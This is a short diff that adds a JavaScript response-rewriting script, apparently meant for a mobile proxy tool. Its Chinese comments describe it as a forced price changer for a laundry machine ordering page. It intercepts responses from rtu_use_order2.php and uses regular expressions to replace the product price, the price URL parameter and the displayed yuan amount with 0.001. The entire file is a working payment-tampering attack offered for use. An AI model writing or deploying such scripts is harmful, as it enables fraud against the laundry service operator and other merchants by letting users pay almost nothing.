@@ -1,0 +1,27 @@
+/*
+ * 脚本名称: 洗衣机暴力显卡级改价 (Response版)
+ * 作用: 不管服务器发来什么，强行把价格改成 0.001
+ * 匹配URL: rtu_use_order2.php
+ */
+
+let body = $response.body;
+
+if (body) {
+    // 1. 修改 JSON 数据中的价格 (针对 output 参数)
+    // Fiddler 里你改的是这个，这里我们也改
+    // "product_price":2760 -> "product_price":1 (即0.001元)
+    body = body.replace(/"product_price":\d+/g, '"product_price":1');
+
+    // 2. 修改 URL 参数中的价格 (针对跳转链接)
+    // price=2.76 -> price=0.001
+    body = body.replace(/price=[\d\.]+/g, 'price=0.001');
+
+    // 3. 修改界面显示的文字 (让你肉眼看到价格变了)
+    // ¥ 2.76 -> ¥ 0.001
+    body = body.replace(/¥\s*[\d\.]+/g, '¥ 0.001');
+
+    console.log("✅ 洗衣机响应体已篡改: 价格全变 0.001");
+    $done({ body });
+} else {
+    $done({});
+}
